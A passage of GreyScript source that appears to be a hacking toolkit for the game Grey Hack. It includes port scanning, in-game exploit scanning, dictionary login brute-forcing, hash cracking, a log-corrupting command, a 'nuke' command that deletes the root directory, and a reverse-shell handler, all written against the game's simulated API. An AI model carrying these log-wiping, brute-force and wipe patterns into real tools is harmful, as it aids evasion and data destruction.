+return usedPort.get_lan_ip==port.local and usedPort.port_number==port.port
+end function
+return some(forwardedPorts,@handleHasPort)
+end function
+getPortInfo=function(port)
+result={}
+result.port=port.port_number
+result.open=not (port.is_closed)
+result.local=port.get_lan_ip
+result.forwarded=handleFindPortInUsedPorts(result)
+result.type=router.port_info(port).split("" "")[0]
+result.version=router.port_info(port).split("" "")[1]
+return result
+end function
+handleReduceDevicePorts=function(acc,port)
+if not acc.hasIndex(port.local) then
+acc[port.local]=[]
+end if
+acc[port.local].push(port)
+return acc
+end function
+handleGetPorts=function(device)
+return device.ports
+end function
+handleRemoveDublicates=function(device)
+return distinct(device.value)
+end function
+handleFilterNullPorts=function(port)
+return port!=null
+end function
+devices=reduce(map(filter(flat(map(devicesWithPorts,@handleGetPorts)),@handleFilterNullPorts),@getPortInfo),@handleReduceDevicePorts,{})
+devices=map(devices,@handleRemoveDublicates)
+for ip in ips
+if not devices.hasIndex(ip) then
+devices[ip]=[]
+end if
+end for
+if not devices.hasIndex(self.ip.local) then
+devices[self.ip.local]=[]
+end if
+devices[self.ip.local].push({""port"":0,""open"":true,""forwarded"":true,""local"":self.ip.local,""type"":""kernel_router"",""version"":self.version})
+return devices
+end function
+Router.New=function(ip)
+if not (is_valid_ip(ip)) then
+return Error.New(""Invalid ip"")
+end if
+result=new Router
+result.router=get_router(ip)
+if result.router==null then
+return Error.New(""Invalid ip"")
+end if
+return result
+end function",1);m("/root/vipersrc/managers/macro/macro-manager.src","MacroManager={}
+MacroManager.mediator=null
+MacroManager.init=function()
+return self.runMacro(""init"")
+end function
+MacroManager.runMacro=function(name)
+commandManager=self.mediator.getExtension(""commandManager"")
+macro=self.getMacro(name)
+if macro isa Error then
+return Error.New(""Could not find macro ""+name)
+end if
+lines=macro.split(""\n"")
+for line in lines
+commandManager.executeCommand(line)
+end for
+end function
+MacroManager.getMacro=function(name)
+folder=self.getMacroFolder
+if folder isa Error then
+return folder
+end if
+macro=folder.child(name)
+if macro isa Error then
+return macro
+end if
+return macro.content
+end function
+MacroManager.getMacroFolder=function()
+sessionManager=self.mediator.getExtension(""sessionManager"")
+pivotSession=sessionManager.pivotSession
+handler=pivotSession.handler
+user=handler.user
+folder=handler.getFile(""/home/guest/Config"")
+if user==""root"" then
+folder=handler.getFile(""/root/Config"")
+else if user!=""guest"" then
+folder=handler.getFile(""/home/""+user+""/Config"")
+end if
+if folder isa Error then
+return Error.New(""Could not get config folder"")
+end if
+macroFolder=folder.child(""Macros"")
+if macroFolder isa Error then
+handler.createFolder(folder.path+""/Macros"")
+end if
+macroFolder=folder.child(""Macros"")
+if macroFolder isa Error then
+return Error.New(""Could get macro folder"")
+end if
+return macroFolder
+end function
+MacroManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+MacroManager.New=function()
+self=new MacroManager
+self.mediator=null
+return self
+end function",1);m("/root/vipersrc/managers/config/config-manager.src","ConfigManager={}
+ConfigManager.mediator=null
+ConfigManager.config=null
+ConfigManager.saveConfig=function(config)
+self.config=self.config+config
+self.saveConfigToFile
+end function
+ConfigManager.saveConfigToFile=function()
+file=self.getConfigFile
+if file isa Error then
+return file
+end if
+file.setContent(toJSON(self.config))
+end function
+ConfigManager.init=function()
+file=self.getConfigFile
+if file isa Error then
+return file
+end if
+config=file.content
+if config=="""" then
+file.setContent(""{}"")
+config=file.content
+end if
+self.config=parse(config)
+end function
+ConfigManager.getConfigFile=function()
+sessionManager=self.mediator.getExtension(""sessionManager"")
+pivotSession=sessionManager.pivotSession
+handler=pivotSession.handler
+user=handler.user
+folder=handler.getFile(""/home/guest/Config"")
+if user==""root"" then
+folder=handler.getFile(""/root/Config"")
+else if user!=""guest"" then
+folder=handler.getFile(""/home/""+user+""/Config"")
+end if
+if folder isa Error then
+return Error.New(""Could not get config folder"")
+end if
+file=handler.getFile(folder.path+""/viper-config.json"")
+if file isa Error then
+handler.createFile(folder.path+""/viper-config.json"")
+file=handler.getFile(folder.path+""/viper-config.json"")
+if file isa Error then
+return Error.New(""Could not create config file"")
+end if
+end if
+return file
+end function
+ConfigManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+ConfigManager.New=function()
+result=new ConfigManager
+return result
+end function",1);m("/root/vipersrc/jumpfile/jumpfile-text.src","jumpfileText=""
+getLib = function (path)
+    return include_lib(path)
+end function
+
+loginAs = function (user, pass)
+    return get_shell(user, pass)
+end function
+
+type = params[0]
+
+if type == """"login"""" then
+    user = params[1]
+    pass = params[2]
+    dict = params[3]
+    result = loginAs(user, pass)
+
+    if get_custom_object.hasIndex(""""passwords"""") and dict == """"true"""" then
+        passwords = get_custom_object.passwords
+
+        for pass in passwords 
+            result = loginAs(user, pass)
+            if result != null then break
+        end for
+    end if
+
+    get_custom_object.user = result
+else if type == """"getLib"""" then
+    path = params[1]
+    result = getLib(path)
+    get_custom_object.lib = result
+end if""",1);m("/root/vipersrc/utils/random-ip.src","randomIp=function()
+ip=""""
+for i in range(1,4)
+ip=ip+floor(rnd*255)
+if i<4 then
+ip=ip+"".""
+end if
+end for
+if get_router(ip)==null then
+return randomIp
+end if
+return ip
+end function",1);m("/root/vipersrc/commands.src","lsCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+file=handler.getFile(path)
+if file isa Error then
+return file
+end if
+if file.children isa Error then
+return file.children
+end if
+viperUi.ls(file.children)
+end function
+commandManager.registerCommand(Command.New({""name"":""ls"",""description"":""List all items in the provided directory"",""parameters"":[Parameter.New({""name"":""path"",""required"":false,""default"":"".""})],""callback"":@lsCommandHandler}))
+fsCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+file=handler.getFile(path)
+if file isa Error then
+return file
+end if
+viperUi.fileSystem(file)
+end function
+commandManager.registerCommand(Command.New({""name"":""fs"",""description"":""Display file system information"",""parameters"":[Parameter.New({""name"":""path"",""required"":false,""default"":""/""})],""callback"":@fsCommandHandler}))
+cdCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+return handler.goTo(path)
+end function
+commandManager.registerCommand(Command.New({""name"":""cd"",""description"":""Change directory"",""parameters"":[Parameter.New({""name"":""path"",""required"":true})],""callback"":@cdCommandHandler}))
+chmodCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+fpath=params.fpath
+perms=params.perms
+recursive=params.recursive
+return handler.setPermissions(fpath,perms,recursive)
+end function
+commandManager.registerCommand(Command.New({""name"":""chmod"",""description"":""Chmods a file or directory."",""parameters"":[FlagParameter.New({""name"":""recursive"",""required"":false,""default"":"""",""flag"":""-R""}),Parameter.New({""name"":""perms"",""required"":true}),Parameter.New({""name"":""fpath"",""required"":true})],""callback"":@chmodCommandHandler}))
+chownCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+fpath=params.fpath
+newOwner=params.newOwner
+recursive=params.recursive
+return handler.setOwner(fpath,newOwner,recursive)
+end function
+commandManager.registerCommand(Command.New({""name"":""chown"",""description"":""Changes the owner of a file or directory."",""parameters"":[FlagParameter.New({""name"":""recursive"",""required"":false,""default"":"""",""flag"":""-R""}),Parameter.New({""name"":""newOwner"",""required"":true}),Parameter.New({""name"":""fpath"",""required"":true})],""callback"":@chownCommandHandler}))
+chgrpCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+fpath=params.fpath
+newGroup=params.newGroup
+recursive=params.recursive
+return handler.setGroup(fpath,newGroup,recursive)
+end function
+commandManager.registerCommand(Command.New({""name"":""chgrp"",""description"":""Changes the group of a file or directory."",""parameters"":[FlagParameter.New({""name"":""recursive"",""required"":false,""default"":"""",""flag"":""-R""}),Parameter.New({""name"":""newGroup"",""required"":true}),Parameter.New({""name"":""fpath"",""required"":true})],""callback"":@chgrpCommandHandler}))
+mvCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+newPath=params.newPath
+return handler.move(path,newPath)
+end function
+commandManager.registerCommand(Command.New({""name"":""mv"",""description"":""Move a file or directory"",""parameters"":[Parameter.New({""name"":""path"",""required"":true}),Parameter.New({""name"":""newPath"",""required"":true})],""callback"":@mvCommandHandler}))
+writeCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+type=params.type
+content=params.content
+file=handler.getFile(path)
+if file isa Error then
+return file
+end if
+if type=="">"" then
+file.setContent(content)
+else
+file.appendContent(content)
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""write"",""description"":""Write to a file"",""parameters"":[Parameter.New({""name"":""path"",""required"":true}),OptionsParameter.New({""name"":""type"",""required"":true,""options"":{"">"":"">"","">>"":"">>""}}),RestParameter.New({""name"":""content"",""required"":false,""default"":""""})],""callback"":@writeCommandHandler}))
+corruptLogsCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+if handler.type==""file"" then
+return Error.New(""Handler is not a shell or computer"")
+end if
+if handler.user!=""root"" then
+return Error.New(""You must be root to corrupt the logs"")
+end if
+logFile=handler.getFile(""/var/system.log"")
+if logFile isa Error then
+return Error.New(""Failed to get log file"")
+end if
+handler.createFile(""/var/t"")
+handler.move(""/var/t"",""/var/system.log"")
+return ""Corrupted logs""
+end function
+commandManager.registerCommand(Command.New({""name"":""corruptlogs"",""description"":""Corrupt the logs"",""parameters"":[],""callback"":@corruptLogsCommandHandler,""permissions"":{""object"":""computer"",""privilege"":""root""}}))
+cpCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+newPath=params.newPath
+return handler.copy(path,newPath)
+end function
+commandManager.registerCommand(Command.New({""name"":""cp"",""description"":""Copy a file or directory"",""parameters"":[Parameter.New({""name"":""path"",""required"":true}),Parameter.New({""name"":""newPath"",""required"":true})],""callback"":@cpCommandHandler}))
+catCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+file=handler.getFile(path)
+if file isa Error then
+return print(file.message)
+end if
+return file.content
+end function
+commandManager.registerCommand(Command.New({""name"":""cat"",""description"":""Print the contents of a file"",""parameters"":[Parameter.New({""name"":""path"",""required"":true})],""callback"":@catCommandHandler}))
+touchCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+return handler.createFile(path)
+end function
+commandManager.registerCommand(Command.New({""name"":""touch"",""description"":""Create a file"",""parameters"":[Parameter.New({""name"":""path"",""required"":true})],""callback"":@touchCommandHandler,""permissions"":{""object"":""computer""}}))
+mkdirCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+return handler.createFolder(path)
+end function
+commandManager.registerCommand(Command.New({""name"":""mkdir"",""description"":""Create a directory"",""parameters"":[Parameter.New({""name"":""path"",""required"":true})],""callback"":@mkdirCommandHandler,""permissions"":{""object"":""computer""}}))
+rmCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+return handler.delete(path)
+end function
+commandManager.registerCommand(Command.New({""name"":""rm"",""description"":""Delete a file or directory"",""parameters"":[Parameter.New({""name"":""path"",""required"":true})],""callback"":@rmCommandHandler}))
+crackCommandHandler=function(params)
+libMannager=extensionMediator.getExtension(""libManager"")
+lib=libMannager.getCurrentLib(""crypto"")
+if lib==null then
+return Error.New(""No crypto library loaded"")
+end if
+hash=params.hash
+result=lib.lib.decipher(hash)
+return result
+end function
+commandManager.registerCommand(Command.New({""name"":""crack"",""description"":""Crack a hash"",""parameters"":[Parameter.New({""name"":""hash"",""required"":true})],""callback"":@crackCommandHandler}))
+nmapCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+ip=params.ip
+if ip==""random"" then
+ip=randomIp
+end if
+router=Router.New(ip)
+if router isa Error then
+return router
+end if
+devices=router.devices
+allPorts=[]
+handleAddDevice=function(device)
+if device.value.len==0 then
+allPorts.push({""port"":""none"",""open"":false,""forwarded"":false,""local"":device.key,""type"":""none"",""version"":""none""})
+end if
+for port in device.value
+allPorts.push(port)
+end for
+end function
+forEach(devices,@handleAddDevice)
+allPorts.sort(""port"")
+viperUi.nmap(allPorts,router)
+end function
+commandManager.registerCommand(Command.New({""name"":""nmap"",""description"":""Scan the network for devices"",""parameters"":[OptionsParameter.New({""name"":""ip"",""required"":false,""options"":{""ip"":""ip"",""random"":""random""},""default"":""random""})],""callback"":@nmapCommandHandler}))
+sshCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+ip=params.ip
+username=params.username
+password=params.password
+port=params.port
+service=params.service
+result=handler.connectTo(ip,port,username,password,service)
+if result isa Error then
+return result
+end if
+session=sessionManager.addSession(result,{})
+sessionManager.setCurrentSession(sessionManager.getSessionIndex(session))
+end function
+commandManager.registerCommand(Command.New({""name"":""ssh"",""description"":""Login to a computer"",""parameters"":[Parameter.New({""name"":""ip"",""required"":true}),Parameter.New({""name"":""username"",""required"":true}),Parameter.New({""name"":""password"",""required"":true}),Parameter.New({""name"":""port"",""required"":false,""type"":PARAMETER_TYPES.NUMBER,""default"":22}),OptionsParameter.New({""name"":""service"",""required"":false,""options"":{""ssh"":""ssh"",""ftp"":""ftp""},""default"":""ssh""})],""callback"":@sshCommandHandler,""permissions"":{""object"":""shell""}}))
+passwdCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+username=params.username
+password=params.password
+result=handler.setPassword(username,password)
+if result isa Error then
+return result
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""passwd"",""description"":""Change a user's password"",""parameters"":[Parameter.New({""name"":""username"",""required"":true}),Parameter.New({""name"":""password"",""required"":true})],""callback"":@passwdCommandHandler,""permissions"":{""object"":""computer"",""privilege"":""root""}}))
+exploitScanCommandHandler=function(params)
+address=params.address
+port=params.port
+options=params.options
+metaxploitManager=extensionMediator.getExtension(""metaxploitManager"")
+objects=metaxploitManager.hack(address,port,options)
+if objects isa Error then
+return objects
+end if
+if not is_valid_ip(address) then
+libManager=extensionMediator.getExtension(""libManager"")
+lib=libManager.getCurrentLib(""metaxploit"")
+address=lib.data.ip
+else
+if is_lan_ip(address) then
+address=libManager.getCurrentLib(""metaxploit"").data.ip.public
+end if
+if port==null then
+return Error.New(""Port is required"")
+end if
+router=Router.New(address)
+if router isa Error then
+return router
+end if
+devices=router.devices
+handleFindPort=function(device)
+for p in device.value
+if p.open and p.port==to_int(port) then
+return true
+end if
+end for
+return false
+end function
+device=find(devices,@handleFindPort)
+if device==null then
+return Error.New(""Port is not open/found"")
+end if
+localIp=device.key
+publicIp=address
+address={""local"":device.key,""public"":publicIp}
+end if
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+handleAddSessionObject=function(object)
+sessionManager.addSession(object,{""ip"":address})
+end function
+forEach(objects,@handleAddSessionObject)
+end function
+commandManager.registerCommand(Command.New({""name"":""exploitscan"",""description"":""Scan the network for exploits"",""parameters"":[Parameter.New({""name"":""address"",""required"":true}),Parameter.New({""name"":""port"",""required"":false}),Parameter.New({""name"":""options"",""required"":false})],""callback"":@exploitScanCommandHandler}))
+targetsCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+sessions=sessionManager.sessions
+viperUi.targets(sessions)
+end function
+commandManager.registerCommand(Command.New({""name"":""targets"",""description"":""List all targets"",""parameters"":[],""callback"":@targetsCommandHandler}))
+delTargetCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+sessions=sessionManager.sessions
+sessionIndex=params.sessionIndex
+count=params.count
+for i in range(sessionIndex,sessionIndex+count-1)
+if i>=sessions.len then
+break
+end if
+session=sessionManager.removeSession(sessionIndex)
+if session isa Error then
+break
+end if
+end for
+end function
+commandManager.registerCommand(Command.New({""name"":""deltarget"",""description"":""Delete a target"",""parameters"":[Parameter.New({""name"":""sessionIndex"",""required"":true,""type"":PARAMETER_TYPES.NUMBER}),Parameter.New({""name"":""count"",""required"":false,""type"":PARAMETER_TYPES.NUMBER,""default"":1})],""callback"":@delTargetCommandHandler}))
+useCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+sessions=sessionManager.sessions
+sessionIndex=params.sessionIndex
+session=sessionManager.setCurrentSession(sessionIndex)
+if session isa Error then
+return session
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""use"",""description"":""Use a target"",""parameters"":[Parameter.New({""name"":""sessionIndex"",""required"":true,""type"":PARAMETER_TYPES.NUMBER})],""callback"":@useCommandHandler}))
+libsCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+libraryManager=extensionMediator.getExtension(""libManager"")
+libraries=libraryManager.libs
+currentLibs=libraryManager.currentLibs
+pivotLibs=libraryManager.pivotLibs
+libsHasLib=function(libs,lib)
+handleSome=function(libsLib)
+if libsLib.value==lib then
+return true
+end if
+end function
+return some(libs,@handleSome)
+end function
+handleMapLibs=function(lib)
+return {""lib"":lib,""current"":libsHasLib(currentLibs,lib),""pivot"":libsHasLib(pivotLibs,lib)}
+end function
+viperUi.libs(map(libraries,@handleMapLibs))
+end function
+commandManager.registerCommand(Command.New({""name"":""libs"",""description"":""List all libraries"",""parameters"":[],""callback"":@libsCommandHandler}))
+useLibCommandHandler=function(params)
+libraryManager=extensionMediator.getExtension(""libManager"")
+libraries=libraryManager.libs
+libraryIndex=params.libraryIndex
+lib=libraryManager.getLib(libraryIndex)
+if lib isa Error then
+return lib
+end if
+library=libraryManager.setCurrentLib(lib)
+if library isa Error then
+return library
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""uselib"",""description"":""Use a library"",""parameters"":[Parameter.New({""name"":""libraryIndex"",""required"":true,""type"":PARAMETER_TYPES.NUMBER})],""callback"":@useLibCommandHandler}))
+usePivotLibCommandHandler=function(params)
+libraryManager=extensionMediator.getExtension(""libManager"")
+libraries=libraryManager.libs
+libraryIndex=params.libraryIndex
+lib=libraryManager.getLib(libraryIndex)
+if lib isa Error then
+return lib
+end if
+library=libraryManager.setPivotLib(lib)
+if library isa Error then
+return library
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""usepivotlib"",""description"":""Use a library as a pivot"",""parameters"":[Parameter.New({""name"":""libraryIndex"",""required"":true,""type"":PARAMETER_TYPES.NUMBER})],""callback"":@usePivotLibCommandHandler}))
+addLibCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+libManager=extensionMediator.getExtension(""libManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+jumpfileLocation=params.jumpfileLocation
+file=handler.getFile(path)
+if file isa Error then
+return file
+end if
+if jumpfileLocation==null then
+pivotSession=sessionManager.pivotSession
+pivotHandler=pivotSession.handler
+lib=include_lib(file.path)
+if lib==null then
+return Error.New(""Failed to include library"")
+end if
+libManager.addLib(lib,{""path"":file.path,""ip"":pivotHandler.ip})
+else
+jumpFile=handler.getFile(jumpfileLocation)
+if jumpFile isa Error then
+return jumpFile
+end if
+handler.executeFile(jumpfileLocation,""getLib ""+file.path)
+if not get_custom_object.hasIndex(""lib"") then
+return Error.New(""Failed to include library"")
+end if
+lib=get_custom_object.lib
+if lib==null then
+return Error.New(""Failed to include library"")
+end if
+libManager.addLib(lib,{""path"":file.path,""ip"":handler.ip})
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""addlib"",""description"":""Add a library"",""parameters"":[Parameter.New({""name"":""path"",""required"":true}),Parameter.New({""name"":""jumpfileLocation"",""required"":false})],""callback"":@addLibCommandHandler,""permissions"":{""object"":""shell""}}))
+jumpFileCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+file=handler.createFile(path+""/jumpfile.src"")
+if file isa Error then
+handler.delete(path+""/jumpfile.src"")
+if file isa Error then
+return file
+end if
+file=handler.createFile(path+""/jumpfile.src"")
+if file isa Error then
+return file
+end if
+end if
+file=handler.getFile(path+""/jumpfile.src"")
+if file isa Error then
+return file
+end if
+file.setContent(jumpfileText)
+result=handler.buildFile(file.path,handler.getFile(path).path)
+if result isa Error then
+return result
+end if
+file.delete
+end function
+commandManager.registerCommand(Command.New({""name"":""jumpfile"",""description"":""Create a jump file"",""parameters"":[Parameter.New({""name"":""path"",""required"":false,""default"":"".""})],""callback"":@jumpFileCommandHandler,""permissions"":{""object"":""shell""}}))
+executeCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+path=params.path
+parameters=params.parameters
+return handler.executeFile(path,parameters)
+end function
+commandManager.registerCommand(Command.New({""name"":""execute"",""description"":""Execute a file"",""parameters"":[Parameter.New({""name"":""path"",""required"":true}),RestParameter.New({""name"":""parameters"",""required"":false,""default"":""""})],""callback"":@executeCommandHandler,""permissions"":{""object"":""shell""}}))
+sudoCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+user=params.user
+password=params.password
+jumpfileLocation=params.jumpfileLocation
+logIn=function(user,password)
+if jumpfileLocation==null then
+shell=get_shell(user,password)
+if shell==null then
+return Error.New(""Failed to login"")
+end if
+else
+isDict=""false""
+if password==""dict"" then
+isDict=""true""
+end if
+jumpfile=handler.getFile(jumpfileLocation)
+if jumpfile isa Error then
+return jumpfile
+end if
+handler.executeFile(jumpfileLocation,""login ""+user+"" ""+password+"" ""+isDict)
+if not get_custom_object.hasIndex(""user"") then
+return Error.New(""Failed to login"")
+end if
+shell=get_custom_object.user
+if shell==null then
+return Error.New(""Failed to login"")
+end if
+end if
+return shell
+end function
+//removed for simplicity www.venom.com
+if password==""dict"" then
+
+else
+shell=logIn(user,password)
+end if
+if shell isa Error then
+return shell
+end if
+session=sessionManager.addSession(shell,{""ip"":handler.ip})
+sessionManager.setCurrentSession(sessionManager.getSessionIndex(session))
+return ""Logged in""
+end function
+commandManager.registerCommand(Command.New({""name"":""sudo"",""description"":""Login to a shell."",""parameters"":[Parameter.New({""name"":""user"",""required"":true}),OptionsParameter.New({""name"":""password"",""required"":true,""options"":{""password"":null,""dict"":""dict""}}),Parameter.New({""name"":""jumpfileLocation"",""required"":false})],""callback"":@sudoCommandHandler,""permissions"":{""object"":""shell""}}))
+clearCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+libManager=extensionMediator.getExtension(""libManager"")
+clear_screen
+viperUi.init
+currentLibs=libManager.currentLibs
+listCurrentLibs=[]
+for lib in currentLibs
+listCurrentLibs.push(lib.value)
+end for
+viperUi.currentLibs(listCurrentLibs)
+end function
+commandManager.registerCommand(Command.New({""name"":""clear"",""description"":""Clear the screen"",""parameters"":[],""callback"":@clearCommandHandler}))
+termCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+handler.activate
+end function
+commandManager.registerCommand(Command.New({""name"":""term"",""description"":""Go active shell"",""parameters"":[],""callback"":@termCommandHandler,""permissions"":{""object"":""shell""}}))
+getCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+pivotSession=sessionManager.pivotSession
+pivotHandler=pivotSession.handler
+currentSession=sessionManager.currentSession
+currentHandler=currentSession.handler
+fromPath=params.fromPath
+toPath=params.toPath
+result=pivotHandler.getFileFrom(toPath,fromPath,currentHandler)
+if result isa Error then
+return result
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""get"",""description"":""Get a file from the pivot"",""parameters"":[Parameter.New({""name"":""fromPath"",""required"":true}),Parameter.New({""name"":""toPath"",""required"":false,""default"":"".""})],""callback"":@getCommandHandler,""permissions"":{""object"":""shell""}}))
+putCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+pivotSession=sessionManager.pivotSession
+pivotHandler=pivotSession.handler
+currentSession=sessionManager.currentSession
+currentHandler=currentSession.handler
+fromPath=params.fromPath
+toPath=params.toPath
+result=pivotHandler.putFileTo(fromPath,toPath,currentHandler)
+if result isa Error then
+return result
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""put"",""description"":""Put a file to the pivot"",""parameters"":[Parameter.New({""name"":""fromPath"",""required"":true}),Parameter.New({""name"":""toPath"",""required"":false,""default"":"".""})],""callback"":@putCommandHandler,""permissions"":{""object"":""shell""}}))
+nukeCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+currentSession=sessionManager.currentSession
+currentHandler=currentSession.handler
+handleFilter=function(session)
+if session.data.ip==currentSession.data.ip then
+return true
+end if
+return false
+end function
+sessions=filter(sessionManager.sessions,@handleFilter)
+currentHandler.delete(""/"")
+for session in sessions
+session.handler.goTo(""/"")
+end for
+end function
+commandManager.registerCommand(Command.New({""name"":""nuke"",""description"":""Delete all files"",""parameters"":[],""callback"":@nukeCommandHandler,""permissions"":{""privilege"":""root""}}))
+psCommandHabdler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+currentSession=sessionManager.currentSession
+currentHandler=currentSession.handler
+processes=currentHandler.processes
+viperUi.ps(processes)
+end function
+commandManager.registerCommand(Command.New({""name"":""ps"",""description"":""List all processes"",""parameters"":[],""callback"":@psCommandHabdler,""permissions"":{""object"":""computer""}}))
+killCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+currentSession=sessionManager.currentSession
+currentHandler=currentSession.handler
+pid=params.pid
+result=currentHandler.closeProcess(pid)
+if result isa Error then
+return result
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""kill"",""description"":""Kill a process"",""parameters"":[Parameter.New({""name"":""pid"",""required"":true})],""callback"":@killCommandHandler,""permissions"":{""object"":""computer""}}))
+echoCommandHandler=function(params)
+text=params.text
+return text
+end function
+commandManager.registerCommand(Command.New({""name"":""echo"",""description"":""Print text"",""parameters"":[RestParameter.New({""name"":""text"",""required"":false,""default"":""""})],""callback"":@echoCommandHandler}))
+returnCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+sessionManager.setCurrentSession(sessionManager.getSessionIndex(sessionManager.pivotSession))
+end function
+commandManager.registerCommand(Command.New({""name"":""return"",""description"":""Return to the pivot"",""parameters"":[],""callback"":@returnCommandHandler}))
+backCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+count=params.count
+if count==null then
+return Error.New(""Invalid count"")
+end if
+for i in range(0,count-1)
+sessionManager.goBack
+end for
+end function
+commandManager.registerCommand(Command.New({""name"":""back"",""description"":""back out of shell"",""parameters"":[Parameter.New({""name"":""count"",""required"":false,""type"":PARAMETER_TYPES.NUMBER,""default"":1})],""callback"":@backCommandHandler}))
+exitCommandHandler=function(params)
+exit
+end function
+commandManager.registerCommand(Command.New({""name"":""exit"",""description"":""Exit the program"",""parameters"":[],""callback"":@exitCommandHandler}))
+addAliasCommandHandler=function(params)
+commandManager=extensionMediator.getExtension(""commandManager"")
+alias=params.alias
+command=params.command
+commandManager.addAlias(alias,command)
+end function
+commandManager.registerCommand(Command.New({""name"":""addalias"",""description"":""Add an alias"",""parameters"":[Parameter.New({""name"":""alias"",""required"":true}),RestParameter.New({""name"":""command"",""required"":true})],""callback"":@addAliasCommandHandler}))
+nsLookupCommandHandler=function(params)
+address=params.address
+result=nslookup(address)
+if result==""Not Found"" then
+return Error.New(""Not Found"")
+end if
+return result
+end function
+commandManager.registerCommand(Command.New({""name"":""nslookup"",""description"":""Lookup an ip address"",""parameters"":[Parameter.New({""name"":""address"",""required"":true})],""callback"":@nsLookupCommandHandler}))
+secureCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+type=params.type
+if type==""home"" then
+files=handler.getFile(""/"").children
+handleSecureFile=function(file)
+if file.name==""home"" then
+return 
+end if
+file.setPermissions(""o-rwx"",true)
+file.setPermissions(""g-rwx"",true)
+file.setPermissions(""u-rwx"",true)
+end function
+forEach(files,@handleSecureFile)
+else
+files=handler.getFile(""/"").children
+handleSecureFile=function(file)
+file.setPermissions(""o-rwx"",true)
+file.setPermissions(""g-rwx"",true)
+file.setPermissions(""u-rwx"",true)
+end function
+forEach(files,@handleSecureFile)
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""secure"",""description"":""Secure the system"",""parameters"":[OptionsParameter.New({""name"":""type"",""required"":true,""options"":{""home"":""home"",""server"":""server""}})],""callback"":@secureCommandHandler,""permissions"":{""object"":""file"",""privilege"":""root""}}))
+msfvenomCommandHandler=function(params)
+ip=params.ip
+port=params.port
+metaxploitManager=extensionMediator.getExtension(""metaxploitManager"")
+return metaxploitManager.connectRShell(ip,port)
+end function
